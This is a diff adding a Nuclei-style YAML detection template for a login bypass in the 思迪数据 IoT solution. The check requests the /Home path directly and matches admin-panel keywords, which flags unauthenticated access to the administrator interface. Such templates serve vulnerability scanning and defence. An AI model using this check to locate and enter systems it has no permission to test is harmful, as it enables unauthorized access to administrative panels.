@@ -1,0 +1,34 @@
+id: poc-yaml-sdtec-data-home-login-bypass
+info:
+  name: 思迪数据 物联网解决方案 Home 登录绕过漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "思迪数据"
+        part: body
+  - method: GET
+    path:
+      - "{{BaseURL}}/Home"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admin"
+          - "超级管理员"
+          - "产品中心"
+          - "系统管理"
+        part: body
